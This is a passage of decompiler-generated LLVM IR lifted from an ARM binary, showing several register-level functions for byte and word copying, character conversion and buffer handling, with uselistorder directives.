  %v2_13620 = icmp eq i8 %v2_1361c, 0
  store i1 %v2_13620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13620, label %dec_label_pc_13638, label %dec_label_pc_13618.dec_label_pc_13628_crit_edge

dec_label_pc_13618.dec_label_pc_13628_crit_edge:  ; preds = %dec_label_pc_13618
  %v0_13628.pre = load i32, i32* @r7, align 4
  %v1_13628 = inttoptr i32 %v0_13628.pre to i8*
  %v2_13628 = load i8, i8* %v1_13628, align 1
  %v3_13628 = zext i8 %v2_13628 to i32
  store i32 %v3_13628, i32* %r3.global-to-local, align 4
  %v9_1362c = icmp eq i8 %v2_13628, %v2_1361c
  store i1 %v9_1362c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1362c, label %dec_label_pc_13638, label %bb74

bb74:                                             ; preds = %dec_label_pc_13628.preheader, %dec_label_pc_13618.dec_label_pc_13628_crit_edge
  %v2_1357488 = phi i32 [ %v1_13618, %dec_label_pc_13618.dec_label_pc_13628_crit_edge ], [ %v1_13558, %dec_label_pc_13628.preheader ]
  %v0_1357487 = phi i32 [ %v0_1361c, %dec_label_pc_13618.dec_label_pc_13628_crit_edge ], [ %v0_1361c13, %dec_label_pc_13628.preheader ]
  %v2_13630 = load i32, i32* @sb, align 4
  %v3_13630 = sub i32 %v2_1357488, %v2_13630
  %v5_13630 = xor i32 %v2_13630, %v2_1357488
  %v6_13630 = xor i32 %v3_13630, %v2_1357488
  %v7_13630 = and i32 %v6_13630, %v5_13630
  %v8_13630 = icmp slt i32 %v7_13630, 0
  %v9_13630 = icmp slt i32 %v3_13630, 0
  %v10_13630 = icmp eq i32 %v2_1357488, %v2_13630
  store i1 %v10_13630, i1* %cpsr_z.global-to-local, align 1
  %v2_13634 = xor i1 %v9_13630, %v8_13630
  br i1 %v2_13634, label %dec_label_pc_13564, label %dec_label_pc_13638

dec_label_pc_13638:                               ; preds = %dec_label_pc_13628.preheader, %bb74, %dec_label_pc_13618, %dec_label_pc_13618.dec_label_pc_13628_crit_edge, %dec_label_pc_1361c.preheader
  %v0_1363c = phi i32 [ %v1_13558, %dec_label_pc_1361c.preheader ], [ %v1_13558, %dec_label_pc_13628.preheader ], [ %v2_1357488, %bb74 ], [ %v1_13618, %dec_label_pc_13618 ], [ %v1_13618, %dec_label_pc_13618.dec_label_pc_13628_crit_edge ]
  store i32 %v3_1335c, i32* %r2.global-to-local, align 4
  %v9_1363c = icmp eq i32 %v0_1363c, %v3_1335c
  store i1 %v9_1363c, i1* %cpsr_z.global-to-local, align 1
  %v6_13640 = icmp slt i32 %v0_1363c, %v3_1335c
  br i1 %v6_13640, label %dec_label_pc_13644, label %dec_label_pc_13650

dec_label_pc_13644:                               ; preds = %dec_label_pc_13638
  %v0_13644 = load i32, i32* @r8, align 4
  %v1_13644 = and i32 %v0_13644, 1048576
  %v2_13644 = icmp eq i32 %v1_13644, 0
  store i1 %v2_13644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13644, label %dec_label_pc_1339c.backedge, label %dec_label_pc_1364c

dec_label_pc_1364c:                               ; preds = %dec_label_pc_13644, %dec_label_pc_13504, %.thread, %dec_label_pc_13338
  br label %dec_label_pc_13650

dec_label_pc_13650:                               ; preds = %dec_label_pc_13638, %dec_label_pc_13420, %dec_label_pc_1364c
  %v0_13650 = phi i32 [ %v0_13430, %dec_label_pc_13420 ], [ 0, %dec_label_pc_1364c ], [ %v0_1363c, %dec_label_pc_13638 ]
  store i32 %v0_13650, i32* %r0.global-to-local, align 4
  store i32 %v3_13338, i32* @r4, align 4
  store i32 %v6_13338, i32* @r5, align 4
  store i32 %v9_13338, i32* @r6, align 4
  store i32 %v12_13338, i32* @r7, align 4
  store i32 %v15_13338, i32* @r8, align 4
  store i32 %v18_13338, i32* @sb, align 4
  store i32 %v21_13338, i32* @sl, align 4
  store i32 %v24_13338, i32* @fp, align 4
  ret i32 %v0_13650

; uselistorder directives
  uselistorder i32 %v0_13650, { 1, 0 }
  uselistorder i32 %v0_1363c, { 0, 2, 1 }
  uselistorder i32 %v3_13630, { 1, 0 }
  uselistorder i32 %v2_13630, { 1, 0, 2 }
  uselistorder i32 %v2_1357488, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_1362c, { 1, 0 }
  uselistorder i32 %v0_1361c.pre, { 0, 2, 1 }
  uselistorder i32 %v5_135b0, { 1, 0, 2, 3 }
  uselistorder i1 %v9_1362c86, { 1, 0 }
  uselistorder i1 %v9_13554, { 1, 0 }
  uselistorder i32 %v3_1352c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_13504, { 1, 0 }
  uselistorder i1 %v8_134fc, { 1, 0 }
  uselistorder i32 %v3_134cc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_134bc, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_134a4, { 1, 0, 2 }
  uselistorder i32 %v1_13494, { 1, 0, 2 }
  uselistorder i32 %v0_13480, { 0, 2, 1, 3 }
  uselistorder i32 %v1_13478, { 1, 0 }
  uselistorder i32 %v1_13464, { 1, 0 }
  uselistorder i32 %v1_13460, { 1, 0 }
  uselistorder i32 %v1_13420, { 2, 0, 1 }
  uselistorder i32 %v0_13408, { 1, 0 }
  uselistorder i32 %v1_133f8, { 0, 2, 1 }
  uselistorder i1 %v2_13528, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13384, { 2, 0, 1, 3 }
  uselistorder i32 %v1_13378, { 2, 1, 0 }
  uselistorder i32 %v3_13360, { 1, 0 }
  uselistorder i32 %v3_1335c, { 2, 1, 0 }
  uselistorder i32 %v1_13354, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 7, 2, 3, 4, 5, 6, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 16, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 25, 24, 27, 5, 4, 7, 8, 26, 6, 10, 9, 12, 11, 13, 16, 14, 15, 20, 17, 18, 19, 23, 21, 22, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 33, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_13650, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13638, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_13618, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_135cc, { 1, 0 }
  uselistorder label %dec_label_pc_1339c.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13544, { 1, 0 }
  uselistorder label %dec_label_pc_13504, { 1, 0 }
  uselistorder label %dec_label_pc_134f8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_134bc, { 1, 0 }
  uselistorder label %dec_label_pc_133f0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @function_13660(i32* %arg1) local_unnamed_addr {
dec_label_pc_13660:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_13664 = icmp eq i32* %arg1, null
  br i1 %v2_13664, label %dec_label_pc_1368c, label %dec_label_pc_1366c

dec_label_pc_1366c:                               ; preds = %dec_label_pc_13660
  %v2_1366c = load i32, i32* %arg1, align 4
  %v1_13670 = inttoptr i32 %v2_1366c to i16*
  %v2_13670 = call i32 @function_d108(i16* %v1_13670)
  %v0_13674 = load i32, i32* @r4, align 4
  %v1_13674 = add i32 %v0_13674, 20
  %v2_13674 = inttoptr i32 %v1_13674 to i32*
  %v3_13674 = load i32, i32* %v2_13674, align 4
  %v2_13678 = icmp eq i32 %v3_13674, 0
  br i1 %v2_13678, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_1366c
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_1366c, %bb
  store i32 79492, i32* @lr, align 4
  %v1_13680 = xor i1 %v2_13678, true
  call void @__pseudo_cond_branch(i1 %v1_13680, i32 ptrtoint (i32* @global_var_11048.271 to i32))
  %v0_13684 = load i32, i32* @r4, align 4
  store i32 %v0_13684, i32* @r0, align 4
  %v0_13688 = call i32 @function_11048()
  br label %dec_label_pc_1368c

dec_label_pc_1368c:                               ; preds = %dec_label_pc_13660, %bb6
  %v1_13690 = phi i32 [ 0, %dec_label_pc_13660 ], [ %v0_13688, %bb6 ]
  ret i32 %v1_13690

; uselistorder directives
  uselistorder label %dec_label_pc_1368c, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_13694(i32 %arg1) local_unnamed_addr {
dec_label_pc_13694:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_136a0 = load i32, i32* @r4, align 4
  store i32 %v3_136a0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1a714.599 to i32), i32* @r1, align 4
  %v0_136a8 = load i32, i32* @r0, align 4
  %v2_136a8 = call i32 @function_d2bc(i32 %v0_136a8, i32 ptrtoint (i32* @global_var_1a714.599 to i32))
  store i32 %v2_136a8, i32* %r0.global-to-local, align 4
  store i32 %v2_136a8, i32* @r4, align 4
  %v2_136ac = icmp eq i32 %v2_136a8, 0
  br i1 %v2_136ac, label %bb, label %dec_label_pc_136b8

bb:                                               ; preds = %dec_label_pc_13694
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_136b8:                               ; preds = %dec_label_pc_13694
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_136c0 = call i32 @function_15540(i32 1, i32 24)
  store i32 %v2_136c0, i32* %r0.global-to-local, align 4
  %v2_136c4 = icmp eq i32 %v2_136c0, 0
  br i1 %v2_136c4, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_136b8
  %v1_136c8 = load i32, i32* @r4, align 4
  %v3_136c8 = inttoptr i32 %v2_136c0 to i32*
  store i32 %v1_136c8, i32* %v3_136c8, align 4
  %v1_136d0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_136b8, %bb4
  %v1_136d0 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_136b8 ], [ %v1_136d0.pre, %bb4 ]
  %v2_136cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_136cc, i32* @r4, align 4
  ret i32 %v1_136d0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @function_136dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_136dc:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_136dc = load i32, i32* @lr, align 4
  %v2_136e0 = icmp eq i32 %arg1, 0
  br i1 %v2_136e0, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_136dc
  br label %bb11

bb:                                               ; preds = %dec_label_pc_136dc
  %v3_136e8 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_13710 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_136fc = phi i32 [ %arg1, %.thread ], [ %v3_136e8, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_136f8 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_136f8, i32* @ip, align 4
  %v2_13700 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_136f8, i32* %stack_var_-16, align 4
  store i32 %v0_13710, i32* %stack_var_-12, align 4
  %v5_13718 = inttoptr i32 %v0_136fc to i8*
  %v6_13718 = call i32 @function_13754(i8* %v5_13718, i32 %v2_13700, i32 1, i32 16, i32 %arg3)
  %v2_1371c = icmp eq i32 %v6_13718, 0
  br i1 %v2_1371c, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_1372c = phi i32 [ %v6_13718, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_136dc, i32* @lr, align 4
  ret i32 %v1_1372c

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_13730(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_13730:
  store i32 %arg1, i32* @r3, align 4
  %v0_13744 = load i32, i32* @r0, align 4
  %v1_13744 = load i32, i32* @r1, align 4
  %v5_13744 = inttoptr i32 %v0_13744 to i8*
  %v6_13744 = call i32 @function_13754(i8* %v5_13744, i32 %v1_13744, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_13744

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_13754(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13754:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13754 = load i32, i32* @r4, align 4
  store i32 %v3_13754, i32* %stack_var_-12, align 4
  %v10_13758 = icmp eq i32 %tmp, %arg2
  store i1 %v10_13758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_13758, label %dec_label_pc_13770, label %bb

bb:                                               ; preds = %dec_label_pc_13754
  %v4_1375c = icmp eq i8* %arg1, null
  store i1 %v4_1375c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_1375c, label %dec_label_pc_13770.thread, label %bb39

dec_label_pc_13770.thread:                        ; preds = %bb
  %v2_13760 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_13770:                               ; preds = %dec_label_pc_13754
  %v2_137601 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_13770 = icmp eq i8* %arg1, null
  store i1 %v3_13770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13770, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13770
  store i32 %v2_137601, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_13770, %dec_label_pc_13770.thread
  %storemerge20 = phi i32 [ %v2_137601, %dec_label_pc_13770 ], [ %v2_13760, %dec_label_pc_13770.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_137cc28 = phi i32 [ %v2_137601, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_13788 = load i32, i32* @r3, align 4
  %v3_13788 = icmp uge i32 %v0_13788, %arg3
  %arg3.v0_13788 = select i1 %v3_13788, i32 %arg3, i32 %v0_13788
  store i32 %arg3.v0_13788, i32* %r5.global-to-local, align 4
  %v1_13794 = inttoptr i32 %arg2 to i32*
  %v2_13794 = load i32, i32* %v1_13794, align 4
  store i32 %v2_13794, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_13788, i32* %r0.global-to-local, align 4
  %v2_137e022 = icmp eq i32 %arg3.v0_13788, 0
  store i1 %v2_137e022, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_137e022, label %dec_label_pc_137e8, label %dec_label_pc_137a0

dec_label_pc_137a0:                               ; preds = %.thread14.thread, %dec_label_pc_137d8.dec_label_pc_137a0_crit_edge
  %v2_137cc = phi i32 [ %v2_137d8, %dec_label_pc_137d8.dec_label_pc_137a0_crit_edge ], [ %v2_137cc28, %.thread14.thread ]
  %v0_137ac = phi i32 [ %v0_137a0.pre, %dec_label_pc_137d8.dec_label_pc_137a0_crit_edge ], [ %v2_13794, %.thread14.thread ]
  %v1_137a0 = inttoptr i32 %v0_137ac to i32*
  %v2_137a0 = load i32, i32* %v1_137a0, align 4
  %v7_137a4 = icmp eq i32 %v2_137a0, 127
  store i1 %v7_137a4, i1* %cpsr_z.global-to-local, align 1
  %v1_137a8 = urem i32 %v2_137a0, 256
  store i32 %v1_137a8, i32* @ip, align 4
  %v1_137ac = add i32 %v0_137ac, 4
  store i32 %v1_137ac, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_137a0, 128
  br i1 %tmp45, label %dec_label_pc_137c8, label %dec_label_pc_137b4

dec_label_pc_137b4:                               ; preds = %dec_label_pc_137a0
  %v0_137b4 = call i32 @function_d0ec()
  store i32 %v0_137b4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_137c0 = inttoptr i32 %v0_137b4 to i32*
  store i32 84, i32* %v2_137c0, align 4
  %v0_137f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_137f4

dec_label_pc_137c8:                               ; preds = %dec_label_pc_137a0
  %v2_137c8 = icmp eq i32 %v1_137a8, 0
  store i1 %v2_137c8, i1* %cpsr_z.global-to-local, align 1
  %v1_137cc = trunc i32 %v2_137a0 to i8
  %v3_137cc = inttoptr i32 %v2_137cc to i8*
  store i8 %v1_137cc, i8* %v3_137cc, align 1
  %v0_137d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_137d0, label %.dec_label_pc_137e8_crit_edge, label %dec_label_pc_137d8

dec_label_pc_137d8:                               ; preds = %dec_label_pc_137c8
  %v0_137d8 = load i32, i32* %lr.global-to-local, align 4
  %v1_137d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_137d8 = add i32 %v1_137d8, %v0_137d8
  store i32 %v2_137d8, i32* %lr.global-to-local, align 4
  %v0_137dc = load i32, i32* %r0.global-to-local, align 4
  %v1_137dc = add i32 %v0_137dc, -1
  store i32 %v1_137dc, i32* %r0.global-to-local, align 4
  %v2_137e0 = icmp eq i32 %v1_137dc, 0
  store i1 %v2_137e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_137e0, label %dec_label_pc_137e8, label %dec_label_pc_137d8.dec_label_pc_137a0_crit_edge

dec_label_pc_137d8.dec_label_pc_137a0_crit_edge:  ; preds = %dec_label_pc_137d8
  %v0_137a0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_137a0

.dec_label_pc_137e8_crit_edge:                    ; preds = %dec_label_pc_137c8
  %v1_137d0 = load i32, i32* @ip, align 4
  store i32 %v1_137d0, i32* %r2.global-to-local, align 4
  %v0_137e8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_137e8

dec_label_pc_137e8:                               ; preds = %dec_label_pc_137d8, %.dec_label_pc_137e8_crit_edge, %.thread14.thread
  %v0_137e8 = phi i32 [ %v0_137e8.pre, %.dec_label_pc_137e8_crit_edge ], [ %v2_137cc28, %.thread14.thread ], [ %v2_137d8, %dec_label_pc_137d8 ]
  %v1_137e8 = load i32, i32* @sp, align 4
  %v9_137e8 = icmp eq i32 %v0_137e8, %v1_137e8
  store i1 %v9_137e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_137e8, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_137e8
  %v1_137ec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_137ec, i32* %v1_13794, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_137e8, %bb43
  %v0_137f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_137f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_137f0 = sub i32 %v1_137f0, %v0_137f0
  store i32 %v2_137f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_137f4

dec_label_pc_137f4:                               ; preds = %dec_label_pc_137b4, %bb44
  %v0_137f4 = phi i32 [ %v0_137f4.pre, %dec_label_pc_137b4 ], [ %v2_137f0, %bb44 ]
  store i32 %v0_137f4, i32* %r0.global-to-local, align 4
  %v2_137fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_137fc, i32* %r4.global-to-local, align 4
  ret i32 %v0_137f4

; uselistorder directives
  uselistorder i32 %v0_137f4, { 1, 0 }
  uselistorder i32 %v1_137dc, { 1, 0 }
  uselistorder i32 %v2_137d8, { 0, 2, 1 }
  uselistorder i32 %v1_137a8, { 1, 0 }
  uselistorder i32 %v2_137a0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_137cc28, { 1, 0 }
  uselistorder i32 %v2_137601, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 0, 5, 6, 1, 3, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 4, 1, 2, 3, 8, 5, 9, 6, 7 }
  uselistorder i32 127, { 2, 0, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_137f4, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_137e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_137a0, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @function_13804(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_13804:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v2_13818 = call i32 @function_12d0c(i32 %arg1, i32 3)
  store i32 %v2_13818, i32* %r0.global-to-local, align 4
  %v7_1381c = icmp eq i32 %v2_13818, -1
  br i1 %v7_1381c, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_13804
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread

bb10:                                             ; preds = %dec_label_pc_13804
  br label %.thread

.thread:                                          ; preds = %bb, %bb10
  %v1_13830 = xor i1 %v7_1381c, true
  call void @__pseudo_cond_branch(i1 %v1_13830, i32 ptrtoint (i32* @global_var_d7e4.600 to i32))
  %v1_1383c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1383c

; uselistorder directives
  uselistorder i1 %v7_1381c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32)* @function_12d0c, { 2, 3, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13840(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13840:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_13840 = load i32, i32* @r4, align 4
  store i32 %v3_13840, i32* %stack_var_-24, align 4
  %v12_13840 = load i32, i32* @r7, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_138582 = icmp eq i32 %arg3, 0
  store i1 %v2_138582, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_138582, label %dec_label_pc_138e8, label %dec_label_pc_13860

dec_label_pc_13858thread-pre-split:               ; preds = %dec_label_pc_13860
  %v3_13878 = load i32, i32* %r6.global-to-local, align 4
  %v5_13878 = add i32 %v3_13878, %v3_13870
  store i32 %v5_13878, i32* %r6.global-to-local, align 4
  %v4_1387c = load i32, i32* %r5.global-to-local, align 4
  %v5_1387c = sub i32 %v4_1387c, %v3_13870
  store i32 %v5_1387c, i32* %r5.global-to-local, align 4
  %v2_13858 = icmp eq i32 %v5_1387c, 0
  store i1 %v2_13858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13858, label %dec_label_pc_13858.dec_label_pc_138e8.loopexit_crit_edge, label %dec_label_pc_13858thread-pre-split.dec_label_pc_13860_crit_edge

dec_label_pc_13858thread-pre-split.dec_label_pc_13860_crit_edge: ; preds = %dec_label_pc_13858thread-pre-split
  %v3_13860.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1386c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13860

dec_label_pc_13860:                               ; preds = %dec_label_pc_13840, %dec_label_pc_13858thread-pre-split.dec_label_pc_13860_crit_edge
  %v0_1386c = phi i32 [ %v0_1386c.pre, %dec_label_pc_13858thread-pre-split.dec_label_pc_13860_crit_edge ], [ %tmp, %dec_label_pc_13840 ]
  %v0_13868 = phi i32 [ %v5_13878, %dec_label_pc_13858thread-pre-split.dec_label_pc_13860_crit_edge ], [ %arg2, %dec_label_pc_13840 ]
  %v3_13860 = phi i32 [ %v3_13860.pre, %dec_label_pc_13858thread-pre-split.dec_label_pc_13860_crit_edge ], [ 2147483647, %dec_label_pc_13840 ]
  %v0_13864.in = phi i32 [ %v5_1387c, %dec_label_pc_13858thread-pre-split.dec_label_pc_13860_crit_edge ], [ %arg3, %dec_label_pc_13840 ]
  %v3_13864 = phi i32 [ %v5_1387c, %dec_label_pc_13858thread-pre-split.dec_label_pc_13860_crit_edge ], [ %arg3, %dec_label_pc_13840 ]
  %v0_13864 = icmp slt i32 %v0_13864.in, 0
  %storemerge = select i1 %v0_13864, i32 %v3_13860, i32 %v3_13864
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_13868, i32* %r1.global-to-local, align 4
  %v1_1386c = add i32 %v0_1386c, 4
  %v2_1386c = inttoptr i32 %v1_1386c to i32*
  %v3_1386c = load i32, i32* %v2_1386c, align 4
  %v3_13870 = call i32 @function_d000(i32 %v3_1386c, i32 %v0_13868)
  %v1_13874 = icmp slt i32 %v3_13870, 0
  %v2_13874 = icmp eq i32 %v3_13870, 0
  store i1 %v2_13874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_13874, label %dec_label_pc_13884, label %dec_label_pc_13858thread-pre-split

dec_label_pc_13884:                               ; preds = %dec_label_pc_13860
  %v0_13884 = load i32, i32* %r4.global-to-local, align 4
  %v1_13884 = inttoptr i32 %v0_13884 to i16*
  %v2_13884 = load i16, i16* %v1_13884, align 2
  %v3_13884 = zext i16 %v2_13884 to i32
  store i32 %v3_13884, i32* %r3.global-to-local, align 4
  %v1_13888 = add i32 %v0_13884, 8
  store i32 %v1_13888, i32* %r1.global-to-local, align 4
  %v1_1388c = inttoptr i32 %v1_13888 to i32*
  %v2_1388c = load i32, i32* %v1_1388c, align 4
  store i32 %v2_1388c, i32* %r1.global-to-local, align 4
  %v3_1388c = add i32 %v0_13884, 12
  %v4_1388c = inttoptr i32 %v3_1388c to i32*
  %v5_1388c = load i32, i32* %v4_1388c, align 4
  %v1_13890 = or i32 %v3_13884, 8
  store i32 %v1_13890, i32* %r3.global-to-local, align 4
  %v2_13894 = sub i32 %v5_1388c, %v2_1388c
  store i32 %v2_13894, i32* %r2.global-to-local, align 4
  %v9_13894 = icmp eq i32 %v5_1388c, %v2_1388c
  store i1 %v9_13894, i1* %cpsr_z.global-to-local, align 1
  %v1_13898 = trunc i32 %v1_13890 to i16
  store i16 %v1_13898, i16* %v1_13884, align 2
  br i1 %v9_13894, label %dec_label_pc_13884.dec_label_pc_138e4_crit_edge, label %dec_label_pc_138a0

dec_label_pc_13884.dec_label_pc_138e4_crit_edge:  ; preds = %dec_label_pc_13884
  %v0_138e4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_138e4

dec_label_pc_138a0:                               ; preds = %dec_label_pc_13884
  %v0_138a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_138a0 = load i32, i32* %r5.global-to-local, align 4
  %v3_138a0 = icmp ult i32 %v0_138a0, %v1_138a0
  %v9_138a0 = icmp eq i32 %v0_138a0, %v1_138a0
  store i1 %v9_138a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_138a0, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_138a0
  store i32 %v1_138a0, i32* %r2.global-to-local, align 4
  br label %.preheader

